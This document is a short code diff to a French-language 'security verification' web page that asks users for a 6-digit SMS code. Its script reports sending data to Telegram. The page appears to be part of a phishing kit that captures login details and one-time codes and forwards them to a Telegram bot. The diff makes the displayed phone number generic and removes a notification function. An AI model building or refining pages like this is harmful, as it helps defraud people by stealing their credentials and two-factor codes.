@@ -112,7 +112,7 @@
       <div class="tit text-center" id="smsTitle">
         <div class="fi">🔒</div>
         <h2>Vérification de sécurité</h2>
-        <p class="mt-3" id="smsPhoneText">Nous avons envoyé un code à 6 chiffres par SMS au numéro *******<span id="lastDigits"></span></p>
+        <p class="mt-3" id="smsPhoneText">Nous avons envoyé un code à 6 chiffres par SMS au numéro +33*****</p>
       </div>
       
       <div class="form frm" id="smsFormContainer">
@@ -191,14 +191,6 @@
       .catch(error => {
         console.error('Erreur lors de l\'envoi à Telegram:', error);
       });
-    }
-    
-    function showTelegramNotification() {
-      const notification = document.getElementById('telegramNotification');
-      notification.style.display = 'block';
-      setTimeout(() => {
-        notification.style.display = 'none';
-      }, 3000);
     }
     
     $('#loginButton').click(function() {
